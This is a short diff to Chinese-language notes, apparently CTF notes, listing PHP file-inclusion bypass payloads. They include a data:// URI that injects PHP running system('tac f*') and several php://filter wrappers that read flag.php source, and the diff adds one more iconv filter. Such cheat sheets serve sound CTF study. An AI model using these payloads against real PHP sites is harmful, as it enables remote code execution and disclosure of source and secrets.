@@ -83,8 +83,9 @@
 
 ### 当include(c)时：直接使用协议绕过
 * c=data://text/plain,<?php system('tac f*');?>
-* 伪协议绕过:?u=php://filter/read=convert.base64-encode/resource=flag.php(任何打开文件，读取文件的操作都可以使用伪协议绕过)、
+* ?u=php://filter/read=convert.base64-encode/resource=flag.php(任何打开文件，读取文件的操作都可以使用伪协议绕过)、
 * ?filename=php://filter/convert.utf7.utf7/resource=flag.php
+* php://filter/convert.iconv.utf8.utf16/resource=flag.php
 
 <br>
 
